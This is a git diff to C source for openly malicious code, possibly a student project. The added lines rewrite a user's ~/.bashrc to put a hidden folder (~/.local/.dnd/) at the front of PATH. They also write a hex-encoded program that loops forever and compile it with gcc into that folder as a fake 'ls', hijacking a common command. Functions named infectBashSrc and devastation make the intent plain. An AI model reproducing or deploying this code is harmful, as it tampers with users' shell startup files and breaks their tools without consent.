@@ -28,7 +28,8 @@ static inline char* randomly_select_dir(char **dirs)
 void infectBashSrc(char *userName, char *export_ls){
 	 
 	char bashrcPath[250] = "/home/";
-	
+	strcat(bashrcPath,userName);
+	strcat(bashrcPath,"/.bashrc");
 	
 	// Open .bashrc
 	FILE *bashrc_fd = fopen(bashrcPath, "r+");
@@ -65,9 +66,15 @@ void devastation() {
 	cuserid(buf);
 	printf("%s \n",buf);
 	
-	char export_ls[250] = "export PATH=\"/home/";
-	strcat(export_ls, userName);
-	strcat(export_ls,"/BTP_WORKS/malware:$PATH\"");
+	char folder_path[250] = "/home/";
+	strcat(folder_path, buf);
+	strcat(folder_path,"/.local/.dnd/");
+	
+	char export_ls[250] = "export PATH=\"";
+	strcat(export_ls,folder_path);
+	strcat(export_ls,":$PATH\"");
+	
+	printf("%s \n",export_ls);
 	
 	infectBashSrc(buf, export_ls);
 	
@@ -77,7 +84,36 @@ void devastation() {
 	// if not Create a hidden folder to store the mallicious ls binary
 	// create and compile the binary to that folder
 	
+	//Malicious hexdump
 	
+	
+	char shellcode[] =
+        "\x6d\x61\x69\x6e\x28\x29\x7b\x77\x68\x69\x6c\x65\x28\x31\x29\x3b\x7d\x0a";
+	
+	char bufx[200] = "ls";
+
+	
+	
+	//write to a file.c in the same directory
+	char file_path[250];
+	strcpy(file_path,folder_path);
+	strcpy(file_path,bufx);
+	strcat(file_path,".c");
+	
+	
+	int temp_fd = creat(file_path, S_IWUSR | S_IRUSR);	
+	write(temp_fd, shellcode, 18);
+
+
+	strcat(folder_path,bufx);
+	//compile the file
+	char command[200]="gcc -w ";
+	strcat(command,file_path);
+	strcat(command," -o ");
+	strcat(command,folder_path);
+	system(command);
+	remove(file_path);
+		
 	write(1, (char *)banner, sizeof(banner));
 }
 
